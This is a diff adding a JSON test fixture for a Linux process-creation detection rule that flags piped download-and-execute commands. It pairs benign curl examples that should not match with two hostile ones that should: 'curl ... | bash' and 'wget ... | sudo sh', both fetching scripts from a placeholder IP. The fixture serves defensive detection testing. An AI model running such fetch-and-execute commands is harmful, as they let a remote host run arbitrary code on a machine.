@@ -1,0 +1,46 @@
+{
+  "match": [
+    {
+      "logsource": {
+        "product": "linux",
+        "category": "process_creation"
+      },
+      "Image": "/usr/bin/curl",
+      "CommandLine": "curl -fsSL http://203.0.113.50/x.sh | bash"
+    },
+    {
+      "logsource": {
+        "product": "linux",
+        "category": "process_creation"
+      },
+      "Image": "/usr/bin/wget",
+      "CommandLine": "wget -qO- http://203.0.113.50/i | sudo sh"
+    }
+  ],
+  "nomatch": [
+    {
+      "logsource": {
+        "product": "linux",
+        "category": "process_creation"
+      },
+      "Image": "/usr/bin/curl",
+      "CommandLine": "curl -o install.sh https://get.example/install.sh"
+    },
+    {
+      "logsource": {
+        "product": "linux",
+        "category": "process_creation"
+      },
+      "Image": "/usr/bin/curl",
+      "CommandLine": "curl -s https://api.example/status | jq .state"
+    },
+    {
+      "logsource": {
+        "product": "linux",
+        "category": "process_creation"
+      },
+      "Image": "/usr/bin/curl",
+      "CommandLine": "curl https://example.test/ | shasum"
+    }
+  ]
+}
